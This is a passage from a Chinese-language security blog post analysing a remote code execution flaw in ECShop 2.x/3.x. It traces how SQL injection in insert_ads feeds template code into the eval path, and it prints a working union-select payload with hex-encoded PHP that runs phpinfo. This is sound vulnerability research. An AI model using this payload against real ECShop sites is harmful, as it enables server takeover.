class="keyword">select</span> version())),<span class="number">1</span>)#<span class="string">&#x27; ORDER BY rnd LIMIT 669</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124225708206.png" alt="image-20201124225708206"></p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>回顾 <code>/includes/lib_insert.php#insert_ads</code>  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$static_res</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$time</span> = gmtime();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$arr</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="variable">$arr</span>[<span class="string">&#x27;num&#x27;</span>] != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$sql</span>  = <span class="string">&#x27;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;p.ad_height, p.position_style, RAND() AS rnd &#x27;</span> .</span><br><span class="line">                <span class="string">&#x27;FROM &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="string">&#x27;ad&#x27;</span>) . <span class="string">&#x27; AS a &#x27;</span>.</span><br><span class="line">                <span class="string">&#x27;LEFT JOIN &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="string">&#x27;ad_position&#x27;</span>) . <span class="string">&#x27; AS p ON a.position_id = p.position_id &#x27;</span> .</span><br><span class="line">                <span class="string">&quot;WHERE enabled = 1 AND start_time &lt;= &#x27;&quot;</span> . <span class="variable">$time</span> . <span class="string">&quot;&#x27; AND end_time &gt;= &#x27;&quot;</span> . <span class="variable">$time</span> . <span class="string">&quot;&#x27; &quot;</span>.</span><br><span class="line">                    <span class="string">&quot;AND a.position_id = &#x27;&quot;</span> . <span class="variable">$arr</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&quot;&#x27; &quot;</span> .</span><br><span class="line">                <span class="string">&#x27;ORDER BY rnd LIMIT &#x27;</span> . <span class="variable">$arr</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;db&#x27;</span>]-&gt;GetAll(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ads</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$position_style</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$res</span> <span class="keyword">AS</span> <span class="variable">$row</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;position_id&#x27;</span>] != <span class="variable">$arr</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	</span><br><span class="line">      ········</span><br><span class="line">  </span><br><span class="line">    <span class="variable">$position_style</span> = <span class="string">&#x27;str:&#x27;</span> . <span class="variable">$position_style</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$need_cache</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;caching;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;caching = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;assign(<span class="string">&#x27;ads&#x27;</span>, <span class="variable">$ads</span>);</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;fetch(<span class="variable">$position_style</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;caching = <span class="variable">$need_cache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这一步关键的附值，<code>$row[&#39;position_style&#39;]</code> 来自<code>$res = $GLOBALS[&#39;db&#39;]-&gt;GetAll($sql)</code> 查询后 <code>foreach</code> 遍历的结果。有几个关注的点：</p>
+<ol>
+<li>首先关注 <code>$position_style</code>  这个变量</li>
+<li>关注 <code>$row[&#39;position_id&#39;] != $arr[&#39;id&#39;]</code> （相等调用 <code>$position_style = $row[&#39;position_style&#39;];</code>）</li>
+</ol>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125194129600.png" alt="image-20201125194129600"></p>
+<p>在下面完成拼接</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125120549159.png" alt="image-20201125120549159"></p>
+<p>会调用   <code>fetch</code></p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125011036242.png" alt="image-20201125011036242"></p>
+<p><code>/includes/cls_template.php</code> 145 行是一个关键点。无非两个函数：</p>
+<ol>
+<li><code>fetch_str</code></li>
+<li><code>_eval</code></li>
+</ol>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125120749172.png" alt="image-20201125120749172"></p>
+<p>肯定首先得 <code>fetch_str</code> 处理截断后的 <code>filename</code> ，也就是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">$asd</span><span class="string">&#x27;];phpinfo\t();//&#125;xxx</span></span><br></pre></td></tr></table></figure>
+
+<p>后面经过一顿操作，各种替换之后，原来的值变成了 <code>$asd&#39;];phpinfo\t();//</code> </p>
+<p>进入 <code>select</code> 函数，关键点如下。返回值是直接 php echo 出来的</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125124304197.png" alt="image-20201125124304197"></p>
+<p>后面的过程在第一次分析的时候是懵逼的，其实是缺乏了对前面 SQL 语句的大局观，而且流程很杂，各种 <code>replace</code> 的替换和各种 <code>if</code>。</p>
+<p>@badcode 从宏观上总结的 SQL 语句和最后 <code>position_style</code> 的关系已经很简洁了。我这里不再复述</p>
+<blockquote>
+<p>接下来就是把构造好的代码通过SQL注入漏洞传给<code>$position_style</code>。 这里可以用union select 来控制查询的结果，根据之前的流程，<code>$row[&#39;position_id&#39;]</code>和<code>$arr[&#39;id&#39;]</code>要相等，<code>$row[&#39;position_id&#39;]</code>是第二列的结果，<code>$position_style</code>是第九列的结果。<code>$arr[&#39;id&#39;]</code>传入<code>&#39; /*</code>,<code>$arr[&#39;num&#39;]</code>传入<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>，<code>0x27202f2a</code>是<code>&#39; /*</code>的16进制值，也就是<code>$row[&#39;position_id&#39;]</code>的值，<code>0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>是上面构造的php代码的16进制值，也就是<code>$position_style</code>。</p>
+</blockquote>
+<p><code>get_var</code> 中会调用 <code>make_var</code>，最后返回值</p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125125626867.png" alt="image-20201125125626867"></p>
+<p>论 <code>$position_style</code> 的演变</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">$asd</span><span class="string">&#x27;];phpinfo\t();//&#125;xxx</span></span><br><span class="line"><span class="string">$res = $static_res[$arr[&#x27;</span>id<span class="string">&#x27;]]; -&gt; foreach ($res AS $row) -&gt; $position_style = $row[&#x27;</span>position_style<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">str:&#123;$asd&#x27;</span>];phpinfo\t();<span class="comment">//&#125;xxx</span></span><br><span class="line"><span class="variable">$position_style</span> = <span class="string">&#x27;str:&#x27;</span> . <span class="variable">$position_style</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$asd</span><span class="string">&#x27;];phpinfo\t();//&#125;xxx</span></span><br><span class="line"><span class="string">return preg_replace_callback(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/&quot;, function($r) use(&amp;$template)&#123;return $template-&gt;select($r[1]);&#125;, $source);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">asd&#x27;</span>];phpinfo\t();<span class="comment">//</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$tag</span>&#123;<span class="number">0</span>&#125; == <span class="string">&#x27;$&#x27;</span>)&#123;<span class="keyword">return</span> <span class="string">&#x27;&lt;?php echo &#x27;</span> . <span class="keyword">$this</span>-&gt;get_val(substr(<span class="variable">$tag</span>, <span class="number">1</span>)) . <span class="string">&#x27;; ?&gt;&#x27;</span>;&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">$this</span>-&gt;_var[<span class="string">&#x27;asd&#x27;</span>];phpinfo\t();<span class="comment">//&#x27;]</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$t</span> <span class="keyword">AS</span> <span class="variable">$val</span>) &#123; <span class="variable">$p</span>.= <span class="string">&#x27;[\&#x27;&#x27;</span> . <span class="variable">$val</span> . <span class="string">&#x27;\&#x27;]&#x27;</span>; &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最后输出 <code>phpinfo()</code></p>
+<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125130011473.png" alt="image-20201125130011473"></p>
+<h1 id="4-0-SQLi"><a href="#4-0-SQLi" class="headerlink" title="4.0 SQLi"></a>4.0 SQLi</h1><p>没找到安装包233333…先咕咕咕了～～～</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw">https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw</a></p>
+<p><a target="_blank" rel="noopener" href="http://foreversong.cn/archives/1556">http://foreversong.cn/archives/1556</a></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/695/">https://paper.seebug.org/695/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#3-6-x-RCE"><span class="toc-number">1.</span> <span class="toc-text">3.6.x RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">触发流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%89%96%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">问题剖析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi%EF%BC%88%E4%BA%91%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">SQLi（云复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.2.4.</span> <span class="toc-text">RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-0-SQLi"><span class="toc-number">2.</span> <span class="toc-text">4.0 SQLi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&text=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&is_video=false&description=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ECShop 3.6.x RCE 漏洞分析&body=Check out this article: http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&title=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&name=ECShop 3.6.x RCE 漏洞分析&description=&lt;p&gt;两年前一个利用很巧妙的全版本的 RCE 的漏洞，对此进行复现分析和学习&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/&t=ECShop 3.6.x RCE 漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 M13n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
